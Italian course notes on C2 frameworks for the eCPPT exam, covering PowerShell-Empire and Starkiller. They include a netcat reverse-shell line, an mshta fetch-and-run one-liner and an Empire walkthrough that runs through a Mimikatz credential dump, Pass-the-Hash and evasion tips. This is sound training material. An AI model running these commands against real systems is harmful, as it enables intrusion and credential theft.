---
title: "Modulo 08 — Command & Control (C2) — Sintesi Consolidata"
tags:
  - ad-enumeration
  - asm
  - av-evasion
  - bof
  - c2
  - client-side
  - credentials
  - empire
  - hta
  - kerberoasting
  - kerberos
  - lateral-movement
  - linux-privesc
  - macro
  - metasploit
  - mimikatz
  - msfvenom
  - mssql
  - nmap
  - nse
  - ntlm
  - obfuscation
  - pass-the-hash
  - phishing
  - pivoting
  - port-forwarding
  - powerview
  - rdp
  - registers
  - scanning
  - shellcode
  - shellter
  - smb
  - socks
  - sudo
  - windows-privesc
  - winrm
---
# Modulo 08 — Command & Control (C2) — Sintesi Consolidata

> **Corso:** eCPPT Penetration Testing Professional (NEW - 2024)
> **Modulo:** Command & Control (C2 / CNC)
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Video totali:** 10 (numerati 01, 02, 03, 05, 06, 07, 08, 09, 010, 011 — il 04 non e' presente nel materiale sorgente)
> **Scopo del documento:** consolidare in un'unica sintesi tematica i 10 appunti video del modulo, organizzata per concetti (teoria → terminologia → deployment → scelta del framework → uso pratico di PowerShell-Em⁠pire/Star⁠killer → cenni ad altri framework).

---

## Indice

1. [Glossario rapido (cheat-sheet)](#glossario-rapido)
2. [Diagramma architetturale C2](#diagramma-architetturale-c2)
3. [Cos'e' un C2 framework](#1-cose-un-c2-framework)
4. [Terminologia C2 in dettaglio](#2-terminologia-c2-in-dettaglio)
5. [C2 Deployment & Operation](#3-c2-deployment--operation)
6. [C2 Matrix — Scelta del framework](#4-c2-matrix--scelta-del-framework)
7. [PowerShell-Em⁠pire — Architettura](#5-powershell-empire--architettura)
8. [PowerShell-Em⁠pire — Workflow operativo (CLI)](#6-powershell-empire--workflow-operativo-cli)
9. [Star⁠killer — GUI Electron per Em⁠pire](#7-starkiller--gui-electron-per-empire)
10. [Integrazione Em⁠pire ↔ Metasploit (pivoting)](#8-integrazione-empire--metasploit-pivoting)
11. [Cenni ad altri framework (Cobalt Strike, Mythic, Sliver, Havoc, Brute Ratel)](#9-altri-framework-c2)
12. [OPSEC & evasion](#10-opsec--evasion)
13. [Mappa MITRE ATT&CK](#11-mappa-mitre-attck)
14. [Punti d'attenzione esame eCPPT](#12-punti-dattenzione-esame-ecppt)
15. [Riferimenti ai video sorgente](#13-riferimenti-ai-video-sorgente)

---

## Glossario rapido

| Termine | Definizione sintetica |
|---|---|
| **C2 / CNC** | Command & Control: struttura di comunicazione usata da un attaccante per coordinare e controllare i sistemi compromessi. In MITRE ATT&CK e' la tactic **TA0011**. |
| **C2 framework** | Piattaforma software che implementa la tattica C2 (Em⁠pire, Cobalt Strike, Sliver, Mythic, Havoc, Brute Ratel, Covenant, ecc.). |
| **C2 server / Team Server** | Hub centrale che riceve i callback degli agent e instrada i comandi. |
| **Listener** | Processo lato server in ascolto su una porta/protocollo (HTTP, HTTPS, DNS, SMB, ...) che riceve i callback. Analogo dell'`exploit/multi/handler` di Metasploit. |
| **Stager** | Piccolo dropper (one-liner, EXE, HTA, macro, ...) che scarica e lancia lo **stage** (il payload completo). Modello *staged*. |
| **Stage** | Payload completo che lo stager carica in memoria. |
| **Agent / Implant / Beacon** | Runtime sul target che parla con il listener. In Em⁠pire si chiama **agent**, in Cobalt Strike **beacon**, in Metasploit **meterpreter**. Termini spesso usati come sinonimi. |
| **Beacon / Beaconing** | Pattern di callback periodico: l'agent contatta il server ogni `sleep` secondi per ricevere task. **Non e' una reverse shell interattiva**. |
| **Sleep** | Intervallo (in secondi) tra due callback consecutivi dell'agent. Default Em⁠pire = 5 s. |
| **Jitter** | Variabilita' casuale (ratio 0.0–1.0) applicata al sleep per eliminare la periodicita' detectable. Es. `delay=10, jitter=0.5` → callback in [5,15] s. |
| **Callback** | Ogni singola chiamata a casa dell'agent verso il C2 server. |
| **Profile / Malleable C2** | File di configurazione (Cobalt Strike) che descrive come dev'essere il traffico (header HTTP, content-type, host header, URI pattern) per imitare applicazioni legittime. |
| **BOF (Beacon Object File)** | Object COFF eseguito in-memory dentro il beacon di Cobalt Strike (e cloni). Permette estensione dell'implant senza spawnare processi. |
| **Redirector** | Macchina intermedia (proxy/CDN/NGINX) che riceve i beacon e li inoltra al vero team server, nascondendo l'IP reale. |
| **Domain Fronting** | Tecnica di evasion (MITRE T1090.004) per nascondere la vera destinazione del traffico C2 dietro un dominio fidato (es. Cloudflare). |
| **Interface / Client** | Programma con cui l'operatore parla al server (es. `msfconsole`, `powershell-empire client`, Star⁠killer, Cobalt Strike GUI). |
| **Module** | Codice eseguito dall'agent per task specifici (enum, mimi⁠katz, lateral movement, persistence, ...). |
| **In-memory execution** | Esecuzione di codice (PowerShell, .NET assembly, shellcode) senza scrittura su disco — pilastro OPSEC. |
| **Multiplayer / Multi-user** | Capacita' di piu' operatori di collegarsi simultaneamente allo stesso C2 server con account distinti. |
| **High integrity** | Agent in esecuzione con privilegi amministrativi/SYSTEM. In Em⁠pire indicato dall'**asterisco** (`*`) accanto al nome agent. |
| **Donut** | Tool integrato in Em⁠pire per generare shellcode da .NET assembly. |
| **LOLBAS** | "Living Off The Land Binaries And Scripts" — binari Windows legittimi (es. `mshta.exe`, `rundll32`, `regsvr32`) usati per eseguire payload. |

---

## Diagramma architetturale C2

Flusso tipico di una infrastruttura C2 red-team con redirector e domain fronting.

```
+-----------------+        VPN          +---------------------+
|   OPERATOR      |  <---------------->  |   C2 CLIENT (CLI/   |
| (laptop locale) |   tunnel cifrato     |    GUI Star⁠killer)  |
+-----------------+                      +----------+----------+
                                                    | REST API 1337
                                                    | Socket.IO 5000
                                                    v
                                         +---------------------+
                                         |   C2 TEAM SERVER    |
                                         |  (Em⁠pire / CS / ...) |
                                         |   - Listeners       |
                                         |   - Stager builder  |
                                         |   - Modules         |
                                         |   - Logging         |
                                         +----------+----------+
                                                    ^
                                                    | HTTPS (proxy_pass)
                                                    |
                                         +----------+----------+
                                         |    REDIRECTOR       |
                                         |  (NGINX / Apache /  |
                                         |   socat / CDN)      |
                                         |  443/TCP, IP CDN    |
                                         +----------+----------+
                                                    ^
                                                    | HTTPS (Host: legit.tld)
                                                    | Domain Fronting (T1090.004)
                                                    |
+----------------------------------+      +---------+---------+
|  TARGET / VITTIMA                |      |   CDN (Cloudflare)|
|  +----------------------------+  |      |   verifica Host   |
|  |  AGENT / IMPLANT / BEACON  |  | <--> |   header e proxa  |
|  |  (in-memory, sleep+jitter) |  |      +-------------------+
|  +----------------------------+  |
|  egress 443/TCP solamente        |
+----------------------------------+
```

**Letture chiave del diagramma:**

- L'**operatore** non si collega *mai* direttamente al team server (mai SSH diretto). Usa una **VPN** + un **client remoto** per garantire OPSEC e attribuzione legale.
- Il **redirector** e' la prima linea di difesa dell'infrastruttura: se il blue team lo brucia, si rimpiazza senza perdere il team server.
- Il **CDN** (Cloudflare/Fastly/Akamai) viene usato per **domain fronting**: dal punto di vista del firewall del target, il traffico va verso un IP "fidato".
- L'**agent** si comporta come un client web legittimo: HTTPS verso un dominio (mai IP raw), sleep + jitter per evitare pattern detectable.

Variante **peer-to-peer** (tipica di Cobalt Strike con SMB beacons):

```
[ AGENT A ] <---SMB named pipe---> [ AGENT B ] <---SMB---> [ AGENT C ]
     ^
     | HTTPS callback
     v
[ TEAM SERVER ]
```

Solo l'agent "frontier" parla al team server; gli altri sono *chained* via SMB. Resilienza maggiore in ambienti segmentati.

---

## 1. Cos'e' un C2 framework

> **Definizione:** "A C2 framework is a software platform designed for managing, controlling and orchestrating activities on remote systems in an offensive security context." — *Video 03*

**Distinzione fondamentale:** C2 (la **tattica**) e C2 **framework** (lo **strumento**) non sono la stessa cosa. La tattica esisteva prima dei tool moderni; i framework sono nati per **implementare** in modo industrializzato quella tattica.

### Differenza C2 framework vs reverse shell

Una reverse shell `nc -lvnp 4444` collegata a un `nc -e /bin/bash <attacker>` **non** e' un C2 framework. Mancano:

- Encryption nativa del canale (netcat e' in chiaro).
- Multi-user (un solo operatore alla volta).
- Logging strutturato (no audit trail).
- Persistence built-in.
- Moduli pronti per credential dump, lateral movement, exfil.
- Evasion (sleep, jitter, obfuscation).

Un C2 framework offre **nativamente** tutte queste capabilities.

### Le 10 funzionalita' chiave (checklist video 03)

1. **Communication channel** cifrato (HTTP/HTTPS, DNS, WebSocket, FTP, SMTP, custom). **Encryption + obfuscation** sono **non-negoziabili**.
2. **Remote command execution** — esecuzione comandi su endpoint compromessi, accesso file, esecuzione script.
3. **Persistence mechanisms** — startup, scheduled tasks, registry, services, WMI subscription, COM hijacking. Critico per long-term ops (APT).
4. **Lateral movement** — capacita' di muoversi tra host compromessi sfruttando credenziali e vuln di rete (PsExec, WMI, WinRM, SMB, Pass-the-Hash).
5. **Privilege escalation** — moduli per privesc o "living off the land".
6. **Data exfiltration** — collezione e invio dati. Tipicamente in **batch**, off-hours, su canali alternativi (DNS, Dropbox, OneDrive) per eludere monitoring egress.
7. **Automation & scripting** — script tipo MSF resource scripts (`.rc`) per task ripetitivi.
8. **Evasion techniques** — obfuscazione traffico, porte standard, domain fronting, sleep+jitter, malleable profiles.
9. **Payload development** — generazione/modifica di payload custom (EXE, DLL, PowerShell, Python, HTA, macro Office, shellcode).
10. **Logging & reporting** — audit trail timestamped con autore del comando. **Obbligo professionale e legale**: se il cliente contesta un danno, il log e' la prova di chi ha fatto cosa quando.

### Perche' la varieta' di payload conta

Su Windows non sempre puoi droppare un `.exe`. Servono alternative:

- **PowerShell** one-liner (in-memory, no disk).
- **HTA** (`mshta.exe`) — LOLBAS classico.
- **Macro Office** per phishing.
- **Shellcode injected** in processi esistenti.
- **DLL** caricate via `rundll32.exe`.
- **C# PE** compilato in-memory (Roslyn).

Il modello mentale e' il `web_delivery` di Metasploit: un web server espone payload in vari formati, il target esegue il one-liner che fetcha e lancia in-memory.

---

## 2. Terminologia C2 in dettaglio

I termini ricorrono in **tutti** i framework, anche se ognuno usa nomi propri. Sapere tradurre tra framework e' la skill base.

### Tabella di traduzione tra framework

| Concetto generico | Metasploit | PowerShell-Em⁠pire | Cobalt Strike | Sliver |
|---|---|---|---|---|
| C2 server | MSF server | Em⁠pire server | Team Server | Sliver server |
| Interface / Client | `msfconsole` | `powershell-empire client` / Star⁠killer | Aggressor (Java) | `sliver-client` |
| Listener | `exploit/multi/handler` | listener (es. `http`) | listener (`http`, `https`, `dns`, `smb`) | jobs (`http`, `mtls`, `wg`, `dns`) |
| Stager | stager (`windows/x64/meterpreter/...`) | stager (`multi/launcher`, `windows/hta`, ...) | stager (PowerShell, HTA, macro) | implant (mostly stageless) |
| Stage / Agent | meterpreter | agent | beacon | implant / session |
| Beacon callback | session keepalive | beacon | beacon (con `sleep`) | session check-in |
| Sleep | n/a (sessione interattiva) | `delay` option del listener / `sleep` cmd | `sleep <sec> <jitter%>` | `reconfig --reconnect <sec>` |
| Jitter | n/a | `jitter` option | argomento di `sleep` | `--jitter <sec>` |
| Module / Task | post module | `usemodule <path>` | aggressor scripts / BOF | extensions / aliases |

### Approfondimenti per termine

**C2 server.** Hub centrale, modello tipicamente *centralized* (un server, N agent). Hostabile on-premise, su VPS cloud, o come hidden service Tor. E' il "primary" — esistono modelli P2P (Cobalt Strike SMB beacons) e tiered (front + middle + back).

**Listener.** Processo che ascolta su una porta/protocollo. Mentalmente equivale all'`handler` di Metasploit. Puo' essere ospitato sul team server o su un **redirector** (NGINX `proxy_pass` verso il vero server). Tipi comuni: HTTP, HTTPS, DNS, SMB (named pipe), TCP raw, FTP, custom.

**Agent / Implant.** Codice in esecuzione sul target. Quando l'istruttore dice "agent", "implant", "payload" e "stager" sta usando termini quasi-sinonimi che si riferiscono al "pezzo di codice che gira sul target e parla con il C2". Per essere puntuali:

- **Stager** = piccolo dropper iniziale (pochi byte/KB).
- **Stage** = payload completo (decine/centinaia di KB).
- **Agent / Implant / Beacon** = runtime che gira post-stage e gestisce il canale C2.

**Beaconing.** Pattern di callback. Esempio con `sleep = 5 s`:

```
T=0s   agent: "GET /index.html"      → server: "<empty>"
T=5s   agent: "GET /index.html"      → server: "task: run whoami"
T=10s  agent: "POST /submit (result: nt authority\system)"
T=15s  agent: "GET /index.html"      → server: "<empty>"
```

→ Latency dell'interazione = **sleep × 2 round-trip**. Per questo i C2 framework non sono mai "real-time" come una reverse shell interattiva.

**Sleep timer.** Default Em⁠pire = 5 s. Per long-term ops (settimane/mesi) si usano sleep di **ore** (es. `3600` = 1 callback/ora) o **giorni** (mai sotto i 60 s in produzione vera).

**Jitter.** Variabilita' casuale. Espressa come ratio (Em⁠pire) o percentuale (Cobalt Strike).

- Senza jitter: callback ogni esatti 10 s → su Wireshark e' un pattern sequenziale **immediatamente sospetto** (qualsiasi SIEM con baseline lo flag-ga).
- Con jitter 0.5 (50%): callback in `[5 s, 15 s]` → traffico "umano".

Formula: `delay_effettivo ∈ [delay × (1 - jitter), delay × (1 + jitter)]`.

**Profile / Malleable C2.** Specialita' di Cobalt Strike: file di configurazione che descrive ogni dettaglio del traffico (URI, header, content-type, cookie, host header, jitter delle richieste, dimensione dei chunk). Permette di imitare app legittime (Amazon, Office365, Slack). In Em⁠pire la cosa piu' simile sono i **Malleable HTTP listeners** e i custom profiles.

**BOF (Beacon Object File).** Object COFF compilato (`.o`) che il beacon Cobalt Strike carica ed esegue **in-process**, senza fork/exec. Vantaggio OPSEC enorme: niente nuovi processi, niente disk write, accesso diretto alle API del beacon. Sliver, Havoc e Brute Ratel hanno equivalenti.

**Interface / Client.** Puo' essere CLI (Em⁠pire `powershell-empire client`, Sliver `sliver-client`), GUI (Cobalt Strike Aggressor in Java, Star⁠killer in Electron+Vue, Havoc client in C++/Qt) o Web (Mythic, Covenant). Capacita' di connessione remota = abilitatore del **multiplayer**.

---



### Quiz: Cos'è un C2 framework + terminologia

<div class="ecppt-quiz" data-module="08_Command_Control" data-block="0"></div>

## 3. C2 Deployment & Operation

### Fattori da considerare prima di deployare

1. **Payload delivery** — come consegni lo stager? Phishing (allegato/link), web delivery, exploit pubblico, supply chain, drive-by, USB drop. Il framework deve supportare formati compatibili col vettore.
2. **Client-side protection** — AV, EDR, XDR sul target. Determina se servono encoding/obfuscation (PE encoding, shellcode injection, PowerShell obfuscation con Invoke-Obfus⁠cation/ConfuserEx, Power⁠Sploit).
3. **Network-based protection** — egress filtering (quali porte sono aperte in uscita?), IDS/IPS, deep packet inspection, TLS inspection. Influenza la scelta del protocollo C2.

### Initial access vs Post-exploitation

> **Punto critico** (ricorrente nei video 03, 06, 09): il C2 framework **raramente** ottiene l'initial access. L'initial access viene tipicamente da exploit pubblico, phishing con macro, valid accounts, supply chain. Lo stager Em⁠pire/Cobalt Strike viene **droppato dopo** per ottenere un canale stabile.

Esempio dal lab 09:
1. Initial access da error log Apache su porta 4983 che leakka credenziali.
2. `impacket-smbexec` per shell SMB.
3. **Solo a questo punto** si droppa lo stager Em⁠pire.

### Selezione del C2 in base al target OS

- **Target Windows** → preferire framework con supporto ricco per stager Windows: **PowerShell-Em⁠pire** (PowerShell, EXE, DLL, VBA, VBS, HTA, macro, shellcode), **Cobalt Strike**, **Havoc**, **Brute Ratel**.
- **Target Linux/macOS** → **Sliver** (Go, cross-platform), **Mythic** (agenti modulari), **Merlin**.
- **Mixed** → **Sliver**, **Mythic**, Em⁠pire (anche se lato Linux/macOS e' meno completo).
- **Pure PowerShell senza `powershell.exe`** (bypass AppLocker policy basate sull'eseguibile) → **PowerShell-Em⁠pire** lo fa nativamente via `System.Management.Automation` runspace.

### Best practice canale di comunicazione

- **Porte standard**: `443/TCP` (HTTPS) > `80/TCP` (HTTP) > `8080/TCP` (HTTP-alt). Meno sospetto, blende-in.
- **Domini, non IP raw**: il blue team blacklista IP, non domini fidati.
- **HTTPS** per encryption nativa (TLS).
- **Sleep + Jitter** sempre.
- **Protocolli alternativi** se HTTPS e' filtrato: DNS (53/UDP), ICMP, SMB (interno).
- **Redirector** davanti al team server.
- **Domain fronting** se il monitoring egress e' aggressivo.

### Domain Fronting (T1090.004)

**Concetto:** mandare il traffico verso un dominio "innocuo" (`legit.cdn-tld`) ma far si' che il CDN lo proxy verso il vero C2 grazie all'header `Host` HTTPS.

**Setup tipico con Cloudflare** (descritto nel video 06):

1. Operatore registra `legit-domain.com` e lo configura sui name server Cloudflare.
2. Cloudflare proxy: l'A record risolve a un IP Cloudflare.
3. L'agent sul target chiama HTTPS verso `legit-domain.com`.
4. Il traffico esce verso un **IP Cloudflare** (fidato, comune); Cloudflare ispeziona l'`Host` header e inoltra al vero C2 server.
5. La risposta torna proxata da Cloudflare.

**Risultato:** dal perimetro target sembra HTTPS legittimo verso Cloudflare. Difficile da bloccare senza bloccare Cloudflare intero (= business impact). Storicamente usato anche con Fastly, Akamai. Molti CDN nel 2018+ hanno disabilitato il domain fronting "puro"; varianti moderne usano **CDN reflection** o **TLS SNI mismatch**.

### Modelli di deployment

- **Centralized** — un C2 server, N agent. Semplice da gestire, single point of failure. Modello tipico Em⁠pire.
- **Peer-to-peer** — agent comunicano tra loro (es. via SMB named pipe). Piu' resiliente, ideale per **host segmentati** senza egress diretto. Modello tipico Cobalt Strike (SMB beacons) e Sliver (pivot via mTLS).
- **Tiered redirector** — front (CDN) → middle (cloud VPS NGINX) → back (team server isolato). Disposizione mainstream per red team enterprise.

---

## 4. C2 Matrix — Scelta del framework

### Il problema

"Quale C2 uso?" e' la domanda dominante. Non c'e' risposta unica. La proliferazione di framework (>140 alla data del corso) rende la scelta sovraccaricante.

### Il C2 Matrix

Progetto aperto che aggrega in un **Google Sheet** tutti i C2 framework pubblicamente noti, open source e commerciali. Fornisce anche un **questionario interattivo** che, in base ai requisiti dichiarati, suggerisce candidati.

**Risorse:**

| Risorsa | URL | Uso |
|---|---|---|
| C2 Matrix site | https://www.thec2matrix.com/ | Hub progetto |
| C2 Matrix spreadsheet | Google Sheet linkato dal sito | Confronto dettagliato feature-by-feature |
| C2 Matrix questionnaire | https://howto.thec2matrix.com/ | Scelta guidata via Q&A |

### Colonne dello spreadsheet (criteri di valutazione)

- **Identita'**: Name, License (GPL/BSD/Apache/Commercial in rosso), Price, GitHub, Site, Twitter.
- **Implementazione**: Server language, Implant language.
- **UI**: multi-user (yes/no), CLI, Web, GUI, dark mode, API.
- **Payloads**: Windows / Linux / macOS, formati, packaging.
- **C2 channels**: TCP, HTTP, HTTP/2, HTTP/3, DNS, DoH, ICMP, FTP, IMAP, MAPI, SMB, LDAP.
- **Capabilities**: key exchange, steganography, proxy aware, domain fronting, custom profiles, jitter, working hours, kill date, chaining, logging, ATT&CK mapping, dashboard, SOCKS, VPN pivoting, BOF.
- **Detection** (note di detection).
- **Support** (community, docs, mantenimento attivo).

### Domande del questionario

1. Servono multi-user / API?
2. Quali canali ti servono (HTTP, DNS, SMB, ...)?
3. Quali OS devono supportare gli agent?
4. Quali capability servono (proxy aware, custom profile, jitter, logging, domain fronting, ...)?
5. Quale interfaccia preferisci (CLI, GUI, Web)?
6. Che tipo di supporto vuoi (sito, setup guide, GitHub attivo)?

**Esempio output:** con requisiti "multi-user + HTTP + Windows + proxy/profile/jitter/logging/domain fronting + GUI" → suggerisce **Covenant**. Variando (no multi-user, GUI, no support specifico) → **Cobalt Strike, Poshc2, Prismatica**. Il tool non e' perfetto (non include tutti i C2 nel matching) ma e' un buon starting point.

### Scenario di scelta (video 07)

Red team Windows-only, requisiti: proxy-aware, custom profiles, jitter, logging, domain fronting, multi-user, GUI.

1. Apri C2 Matrix questionnaire.
2. Rispondi alle domande con i requisiti.
3. Output filtrato → Em⁠pire / Covenant / Cobalt Strike.
4. Verifica dettagli sul Google Sheet.
5. **Scelta del corso: PowerShell-Em⁠pire** (open source, multi-payload Windows, mantenuto attivamente da BC Security).

---



### Quiz: Deployment, operation, scelta framework

<div class="ecppt-quiz" data-module="08_Command_Control" data-block="1"></div>

## 5. PowerShell-Em⁠pire — Architettura

### Cos'e' Em⁠pire 4

> "Pure PowerShell C2 or post-exploitation framework built on cryptologically secure communications and a flexible architecture." — *BC Security*

- C2 / post-exploitation framework **pure PowerShell** lato agent Windows.
- Esegue agent PowerShell **senza `powershell.exe`** (usa il runspace `System.Management.Automation`) → bypass restrizioni AppLocker basate sull'eseguibile.
- Moduli rapidamente deployable: keylogger, Mimi⁠katz, situational awareness, lateral movement, persistence.
- Comunicazioni cifrate, adatte ad evasion network.

### Storia

- **v1/v2**: PowerShell Em⁠pire originale, Python 2. Progetto archiviato nel **2019**.
- **v3**: merge tra Em⁠pire originale e Python Em⁠pire (lo storico fork con agent Python per Linux/macOS).
- **v4 (corrente)**: riscritto in **Python 3**, mantenuto attivamente da **BC Security**, pacchettizzato in **Kali Linux** come `powershell-empire`.

### Agent supportati

- **PowerShell** (Windows) — pure, senza spawn di `powershell.exe`.
- **Python 3** (Linux/macOS).
- **C# / PE** (Windows) — compilazione Roslyn integrata.

### Architettura

- **Em⁠pire server** — gestisce stager, agent, moduli, listener. Espone:
  - REST API su **`1337/TCP`**.
  - Socket.IO su **`5000/TCP`**.
- **Em⁠pire client (CLI)** — `powershell-empire client`, si connette a server local/remoto via REST.
- **Star⁠killer (GUI)** — Electron + Vue.js, connessione via REST API.
- Server e client si avviano in **terminali separati**.

### Funzionalita' chiave

- **Centralized model** server-client, **multiplayer / multi-user**.
- Client CLI + GUI (Star⁠killer).
- Comunicazioni cifrate: HTTP, HTTPS, Malleable HTTP, **OneDrive**, **Dropbox**, **PHP** listeners.
- **400+ tools** in PowerShell, C#, Python.
- **Donut** integration per shellcode generation/injection da .NET assembly.
- Modular plugin interface server-side, flexible module interface client-side.
- Obfuscation integrata: **ConfuserEx 2** (C#) + **Invoke-Obfus⁠cation** (PowerShell).
- **In-memory .NET assembly execution**.
- **MITRE ATT&CK** mapping integrato (ogni modulo ha la tecnica associata).
- Roslyn compiler integrato per compilation C#.
- Install supportato su Docker, Kali, Ubuntu, Debian.

### Tipi di listener

| Listener | Note |
|---|---|
| `http` | Standard HTTP/HTTPS. Default. |
| `http_com` | HTTP via IE hidden COM object (legacy). |
| `http_foreign` | Inietta payload Em⁠pire da listener "estero". |
| `http_hop` | Redirector / hop — proxy verso un altro listener (nasconde IP originale). |
| `http_mapi` | Sfrutta Liniaal per controllo via Exchange server. |
| `dbx` | Dropbox — richiede token API, ottimo per **exfiltration** discreta. |
| `onedrive` | OneDrive — analogo a Dropbox. |
| `php` | Webshell PHP — per target Linux con web server PHP. |

### Tipi di stager

- **`bash`** — script bash launcher (Linux/macOS).
- **`multi/launcher`** — one-liner PowerShell base64 (Windows). **Il piu' usato in pratica.**
- **`multi/macro`** — macro VBA per Office (Word/Excel) per **initial access via phishing**.
- **`shellcode`** — Windows shellcode raw.
- **`csharp_exe`** — PE C# stager.
- **`dll`** — DLL stager.
- **`hta`** — HTML Application, eseguibile via **`mshta.exe`** (LOLBAS). One-liner: `mshta http://<empire>/file.hta`. **Vettore preferito dell'istruttore.**

### Moduli notevoli (Windows)

- **`credentials/mimi⁠katz/lsadump`** — dump credenziali LSA (NTLM hash).
- **`credentials/mimi⁠katz/sekurlsa`** — Mimi⁠katz full.
- **`situational_awareness/network/winenum`** — enum sistema/rete.
- **`situational_awareness/network/portscan`** — port scan PowerShell.
- **`situational_awareness/network/powerview/*`** — enum AD (Get-NetUser, Get-NetGroup, ecc.).
- **`lateral_movement/invoke_smbexec`** — Pass-the-Hash lateral via SMB.
- **`lateral_movement/invoke_wmi`** — lateral via WMI.
- **`lateral_movement/invoke_psexec`** — lateral PsExec-style.
- **`code_execution/invoke_metasploitpayload`** — **ponte ufficiale Em⁠pire ↔ Metasploit**: prende un URL `web_delivery` e lancia il payload Meterpreter.
- **`persistence/elevated/schtasks`** — persistence via Scheduled Task.
- **`management/invoke_portfwd`** — port forwarding via agent.
- **`privesc/powerup/*`** — privesc Power⁠Up checks.
- **`credentials/seatbelt`** — Seatbelt (in-memory C#).
- **`credentials/rubeus`** — Rub⁠eus (Kerberos abuse).
- **`credentials/certify`** — AD CS abuse.

### Installazione (Kali)

```bash
sudo apt update
sudo apt install -y powershell-empire starkiller
```

---

## 6. PowerShell-Em⁠pire — Workflow operativo (CLI)

### Avvio server + client

```bash
# Terminale 1 — server
sudo powershell-empire server

# Terminale 2 — client CLI
powershell-empire client

# Opzionale — GUI
starkiller
```

> Build errors C# durante l'avvio del server nel lab Kali sono **ignorabili** ai fini didattici.

### Workflow 5-step (lab video 09)

```text
1) uselistener http  →  set Host/Port  →  execute
2) usestager multi/launcher  →  set Listener http  →  execute  →  copy one-liner
3) eseguire l'one-liner sul target (via shell SMB, RDP, phishing, ...)
4) agents  →  rename <id> <nome_leggibile>  →  interact <nome>
5) usemodule <path>  →  set Options  →  execute
```

### Comandi essenziali del client

| Comando | Scopo |
|---|---|
| `uselistener <type>` | Seleziona tipo di listener (`http`, `dbx`, `onedrive`, ...) |
| `set Host/Port/Name/...` | Configura opzioni del listener |
| `execute` | Avvia il listener / esegue il modulo |
| `listeners` | Lista listener attivi |
| `usestager <path>` | Seleziona stager (es. `multi/launcher`, `windows/hta`) |
| `set Listener <name>` | Associa lo stager a un listener |
| `agents` | Lista agent attivi |
| `rename <old> <new>` | Rinomina agent (utile per leggibilita') |
| `interact <agent>` | Entra nel contesto dell'agent |
| `shell <cmd>` | Esegue comando shell **dentro l'agent** (es. `shell whoami /priv`) |
| `info` | Mostra metadati dell'agent (hostname, IP, integrity, user, sleep, jitter) |
| `history` | Mostra log dei task inviati all'agent |
| `sleep <s> [jitter]` | Modifica il delay (e jitter) dell'agent |
| `usemodule <path>` | Carica modulo (es. `powershell/credentials/mimi⁠katz/lsadump`) |
| `set <Option> <value>` | Imposta opzioni del modulo |
| `main` | Torna al menu principale |
| `creds` | Mostra credenziali raccolte automaticamente |

### Asterisco e high integrity

Nella lista `agents`, un **asterisco (`*`)** accanto al nome dell'agent indica **high integrity** (esecuzione come Admin/SYSTEM). Senza asterisco l'agent gira come utente normale. Memorizzare: e' una **domanda d'esame potenziale**.

### Beacon delay

Default Em⁠pire: **5 secondi**. I comandi non sono real-time: ogni task arriva al **prossimo callback**. Modificabile con:

- `sleep <secondi>` (dentro l'agent).
- `set Delay <s>` sul listener (default per nuovi agent).
- `set Jitter <ratio>` (0.0 – 1.0).

### Esempio operativo (block notes)

```text
# Listener HTTP su porta 8888
uselistener http
set Host 10.10.14.7
set Port 8888
execute
main

# Stager PowerShell base64 one-liner
usestager multi/launcher
set Listener http
execute
# -> copia il blob "powershell -nop -w 1 -enc <base64>"

# Esegui il blob nel target (shell SMB / RDP / phishing)
# -> ritorno nel client:
agents
rename ABCD123 demo-ine
interact demo-ine

# Verifica privilegi
shell whoami /priv
info
history

# Enum sistema/rete
usemodule powershell/situational_awareness/network/winenum
execute

# Dump credenziali LSA
usemodule powershell/credentials/mimi⁠katz/lsadump
execute

# Port scan verso fileserver
usemodule powershell/situational_awareness/network/portscan
set Hosts 192.168.50.100
execute

# Lateral movement Pass-the-Hash
usemodule powershell/lateral_movement/invoke_smbexec
set Username administrator
set Hash AAD3B435B51404EEAAD3B435B51404EE:32ED87BDB5FDC5E9CBA88547376818D4
set ComputerName 192.168.50.100
set Command whoami
execute

# Port forwarding (alternativa al SOCKS)
usemodule powershell/management/invoke_portfwd
set ListenAddress 10.10.14.7
set ListenPort 4445
set ConnectAddress 192.168.50.100
set ConnectPort 445
execute
```

---



### Quiz: PowerShell-Em⁠pire: setup, listener, stager, agent

<div class="ecppt-quiz" data-module="08_Command_Control" data-block="2"></div>

## 7. Star⁠killer — GUI Electron per Em⁠pire

### Cosa e'

**Star⁠killer** = GUI **Electron + Vue.js** ufficiale per PowerShell-Em⁠pire, mantenuta da BC Security.

- E' un **front-end puro**: si collega al server Em⁠pire via **REST API** (default `localhost:1337`).
- **Tutta** la logica (listener, beacon, moduli) sta sul server. Senza server, la GUI e' inutile.
- **Credenziali default:** `empire_admin / password123` (in passato `admin / empireadmin`). Cambiare in produzione.

### Avvio

```bash
# Server (sempre necessario)
sudo powershell-empire server

# GUI
starkiller
# Login -> endpoint localhost:1337, user empire_admin / password123
```

### Layout (sidebar)

- **Listeners** — crea/edita/elimina listener (HTTP, HTTPS, Malleable, Dropbox, OneDrive, PHP).
- **Stagers** — genera stager con form visuale.
- **Agents** — lista agent con metadati (hostname, internal IP, user, integrity, last seen).
- **Modules** — ricerca per categoria, esecuzione con form.
- **Credentials** — credenziali raccolte (NTLM hash, plaintext, ticket).
- **Reporting** — generazione report.
- **Users** — creazione account per altri operatori (es. `redteam1`, `redteam2`) per **multiplayer remoto**.
- **Plugins** — lista plugin pre-pacchettizzati, start/stop con bottone Submit.
- **Settings** — dark/light mode, chat widget toggle, API token, password.

### Plugin inclusi

| Plugin | Funzione |
|---|---|
| `csharpserver` | Compila stager/moduli C# (Roslyn) |
| `websockify` | Bridge WebSocket per comunicazioni custom |
| `socks_proxy_server` | Reverse SOCKS shell via stager |

### Setup operativo (mirror del lab CLI)

1. **Listeners → Create → Type: http** → form con `Host`, `Port=8888`, `DefaultDelay=5`, `DefaultJitter=0.0`, header server, ecc. → **Submit** → "running".
2. **Stagers → Create → multi/launcher** → Listener=`http`, Language=`powershell`, opzionale obfuscation → **Submit** → tasto **Copy to clipboard** (output non stampato come in CLI).
3. Incollare il one-liner nella shell del target → callback istantaneo.
4. **Agents** → nuova riga con tutti i metadati.
5. **View** sull'agent → console interattiva con campo comandi (es. `whoami`, `systeminfo`) → freccia per espandere output → upload/download file → clear queued tasks → pop-out.

### Moduli da GUI

- **Modules** → ricerca per categoria (`situational_awareness/winenum`, `credentials/mimi⁠katz/lsadump`, ecc.).
- Si possono **incatenare** moduli sul tab Agents → View → ricerca → Submit. L'agent eredita la selezione (no `set Agent` manuale).
